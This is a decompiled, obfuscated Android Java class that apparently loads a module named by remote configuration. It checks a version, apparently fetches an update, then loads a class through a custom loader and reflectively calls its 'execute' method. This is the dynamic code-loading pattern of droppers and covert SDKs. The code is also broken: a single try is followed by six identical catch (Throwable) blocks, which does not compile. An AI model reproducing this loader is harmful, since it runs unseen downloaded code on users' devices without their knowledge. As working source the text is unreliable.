package com.bgjd.ici.p025b;

import android.annotation.SuppressLint;
import com.bgjd.ici.json.JSONObject;
import com.bgjd.ici.p025b.C1421q.C1412b;
import com.bgjd.ici.p030e.C1487j;

public class C1414o {
    private static final String f2177b = "OVRLOGGER";
    JSONObject f2178a = null;
    private C1395h f2179c;

    public C1414o(C1395h c1395h) {
        this.f2179c = c1395h;
    }

    @SuppressLint({"NewApi"})
    public JSONObject m2916a() {
        JSONObject W = this.f2179c.mo2196W();
        if (W != null) {
            final C1487j c1487j = new C1487j(W);
            if (c1487j.m3161m() && c1487j.m3143a()) {
                if (c1487j.m3159k().equalsIgnoreCase(this.f2179c.mo2197X())) {
                    m2915a(c1487j);
                } else {
                    new C1421q(this.f2179c).mo2310a(c1487j, new C1412b(this) {
                        final /* synthetic */ C1414o f2176b;

                        public void mo2303a(boolean z) {
                            if (z) {
                                this.f2176b.f2179c.mo2282q(c1487j.m3159k());
                                this.f2176b.m2915a(c1487j);
                            }
                        }

                        public void mo2302a(Throwable th, String str) {
                            C1402i.m2898a(C1414o.f2177b, th, th.getMessage());
                        }
                    });
                }
            }
        }
        return this.f2178a;
    }

    private void m2915a(C1487j c1487j) {
        try {
            Class a = ac.m2857a(c1487j, this.f2179c, getClass().getClassLoader());
            Object invoke = a.getMethod("execute", new Class[0]).invoke(a.getConstructor(new Class[]{Integer.TYPE, String.class, Object.class}).newInstance(new Object[]{Integer.valueOf(c1487j.m3150d()), c1487j.m3159k(), this.f2179c}), new Object[0]);
            if (invoke != null) {
                this.f2178a = new JSONObject(invoke.toString());
            }
        } catch (Throwable e) {
            C1402i.m2898a(f2177b, e, e.getMessage());
        } catch (Throwable e2) {
            C1402i.m2898a(f2177b, e2, e2.getMessage());
        } catch (Throwable e22) {
            C1402i.m2898a(f2177b, e22, e22.getMessage());
        } catch (Throwable e222) {
            C1402i.m2898a(f2177b, e222, e222.getMessage());
        } catch (Throwable e2222) {
            C1402i.m2898a(f2177b, e2222, e2222.getMessage());
        } catch (Throwable e22222) {
            C1402i.m2898a(f2177b, e22222, e22222.getMessage());
        }
    }
}
